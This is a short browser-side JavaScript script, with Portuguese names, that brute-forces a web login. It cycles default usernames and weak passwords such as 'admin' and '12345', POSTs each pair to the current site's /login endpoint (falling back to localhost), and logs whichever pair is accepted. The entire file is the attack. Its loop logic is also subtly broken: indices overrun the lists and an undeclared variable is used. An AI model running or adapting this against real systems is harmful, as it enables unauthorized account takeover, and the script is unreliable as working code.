const dicionario = {
    logins: ['adm', 'administrador', 'admin',],
    senhas: ['adm', '123', '1234', '12345', 'administrador', 'admin']
};

let data = {};
let find = {};

const url =  window.location.origin || 'http://localhost:4343';
const urlAlvo = `${url}/login`;

let login = 0, pwd = 0;
let count = 0;
a();
function a() {
    count++;
    data.login = dicionario.logins[login];
    data.senha = dicionario.senhas[pwd];
    console.log(`Tentativa nº ${count} :::: Testando senha: '${data.senha}'  `);
    $.ajax({
        url: urlAlvo,
        type: 'POST',
        data: JSON.stringify(data),
        dataType: "json",
        contentType: "application/json; charset=utf-8",
        statusCode: {
            200: () => {
                bad = false;
                find.login = dicionario.logins[login];
                find.senha = dicionario.senhas[pwd];
                b();
            },
            401: () => {
                if (login++ > dicionario.logins.length) {
                    login = 0;
                    if (pwd++ > dicionario.senhas.length) {
                        pwd = 0;
                    }
                }
                if (login >= dicionario.logins.length && pwd >= dicionario.senhas.length) {
                    b();
                } else {
                    a();
                }
            }
        }
    });
}

function b() {
    console.log({ loginEncontrado: find });
}